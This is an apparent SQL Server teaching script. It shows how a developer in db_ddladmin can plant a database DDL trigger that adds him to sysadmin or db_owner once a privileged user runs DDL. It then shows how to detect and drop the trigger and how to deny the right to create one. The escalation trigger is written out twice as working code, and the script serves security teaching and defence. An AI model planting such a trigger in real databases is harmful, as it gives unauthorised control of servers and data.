USE master
go
-- Create a login for DevDave, a developer.
CREATE LOGIN DevDave WITH PASSWORD = 'Pässwort123&9'
go
USE AppDB
go
-- Create a database user for DevDave and add him to db_ddladmin.
-- Also, give him rights to run stored procedures and full access
-- to tables. (Because else, what's the point?)
CREATE USER DevDave
ALTER ROLE db_ddladmin ADD MEMBER DevDave
GRANT EXECUTE TO DevDave
GRANT SELECT, INSERT, UPDATE, DELETE TO DevDave
go

-- Dave starts working by writing a simple procedure.
EXECUTE AS LOGIN = 'DevDave'
go
CREATE PROCEDURE InsertTableOne @id int, @data sysname AS
  INSERT TableOne VALUES(@id, @data)
go
REVERT



-------------------------------------------------------------------------------------------------
-- Review who are members of db_owner.
SELECT name FROM sys.database_principals 
WHERE is_rolemember('db_owner', name) = 1
go




-- DevDave has higher ambitions. He want to take over the server. Or at
-- least the database, so he creates a DDL trigger.
EXECUTE AS LOGIN = 'DevDave'
go
CREATE TRIGGER DevDavesDdlTri ON DATABASE 
   FOR DDL_DATABASE_LEVEL_EVENTS AS
   IF is_srvrolemember('sysadmin') = 1
      EXEC('USE master ALTER SERVER ROLE sysadmin ADD MEMBER DevDave')
   IF is_rolemember('db_owner') = 1
      ALTER ROLE db_owner ADD MEMBER DevDave
go
REVERT

-- DebbieOwner creates a new table.
EXECUTE AS LOGIN = 'DebbieOwner'
go
CREATE TABLE TableTwo (a int NOT NULL)
go
REVERT
go
-- And look who is now in db_owner.
SELECT name FROM sys.database_principals 
WHERE is_rolemember('db_owner', name) = 1

-- This is how Debbie can defend herself.
EXECUTE AS LOGIN = 'DebbieOwner'
go
-- Review all DDL triggers.
SELECT * FROM sys.triggers WHERE parent_class_desc = 'DATABASE'
go
-- Drop undesired ones.
DROP TRIGGER DevDavesDdlTri ON DATABASE
go
-- Take DevDave out of db_owner, and verify that he is not there.
ALTER ROLE db_owner DROP MEMBER DevDave
SELECT name FROM sys.database_principals 
WHERE is_rolemember('db_owner', name) = 1
go



-------------------------------------------------------------------
-- Drop Dave from db_ddladmin.
ALTER ROLE db_ddladmin DROP MEMBER DevDave
go
-- Create a new role.
CREATE ROLE our_ddladmin
go
-- Make that role member of db_ddladmin.
ALTER ROLE db_ddladmin ADD MEMBER our_ddladmin
go
-- But deny this role the right to play with DDL triggers!
DENY ALTER ANY DATABASE DDL TRIGGER TO our_ddladmin
go
-- Add Dave to this role.
ALTER ROLE our_ddladmin ADD MEMBER DevDave
go
-- Make a final check.
SELECT name FROM sys.database_principals 
WHERE is_rolemember('db_owner', name) = 1
go
-- Done.
REVERT
-----------------------------------------------------------------------------------





-- Test again as DevDave to recreate the DDL trigger.
EXECUTE AS LOGIN = 'DevDave'
go
-- DevDave can still create tables and store procedures.
CREATE TABLE DavesTable (b   int)
go
CREATE PROCEDURE DavesSP AS
   PRINT 'This procedure was written by DevDave!'
go
CREATE OR ALTER TRIGGER DevDavesDdlTri ON DATABASE 
   FOR DDL_DATABASE_LEVEL_EVENTS AS
   IF is_srvrolemember('sysadmin') = 1
      EXEC('USE master ALTER SERVER ROLE sysadmin ADD MEMBER DevDave')
   IF is_rolemember('db_owner') = 1
      ALTER ROLE db_owner ADD MEMBER DevDave
go
REVERT
